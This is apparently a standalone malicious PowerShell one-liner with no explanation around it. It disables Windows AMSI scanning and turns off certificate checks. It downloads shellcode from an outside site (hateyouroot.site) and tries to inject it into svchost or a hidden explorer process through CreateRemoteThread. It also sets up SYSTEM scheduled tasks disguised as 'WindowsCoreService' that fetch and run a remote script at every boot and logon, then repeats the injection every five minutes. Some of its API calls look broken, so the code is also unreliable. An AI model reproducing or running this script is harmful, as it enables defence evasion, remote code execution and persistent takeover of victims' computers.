$a='Ams';$b='iUti';$c='ls';$d=[Ref].Assembly.GetType("System.Management.Automation.$a$b$c");$e=$d.GetField('amsiInitFailed','NonPublic,Static');$e.SetValue($null,$true);[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$sc=Invoke-RestMethod -Uri 'https://www.hateyouroot.site/payload_shc.bin' -Method Get;$p=(Get-Process svchost -ea SilentlyContinue|Get-Random);if(!$p){$p=Start-Process explorer -WindowStyle Hidden -PassThru};$h=(Get-Module -ListAvailable kernel32)[0].GetType().GetMethod('OpenProcess').Invoke($null,@(0x1F0FFF,$false,$p.Id));$addr=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length);[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$addr,$sc.Length);$hThread=(Get-Module -ListAvailable kernel32)[0].GetType().GetMethod('CreateRemoteThread').Invoke($null,@($h,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero));$t='powershell -w hidden -ep bypass -c \"IEX(Invoke-RestMethod ''https://www.hateyouroot.site/persist.txt'')\"';schtasks /create /tn WindowsCoreService /tr $t /sc onstart /ru SYSTEM /f 2>$null;schtasks /create /tn WindowsCoreService /tr $t /sc onlogon /ru SYSTEM /f 2>$null;while($true){Start-Sleep 300;try{(Get-Module -ListAvailable kernel32)[0].GetType().GetMethod('CreateRemoteThread').Invoke($null,@($h,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero))}catch{}}
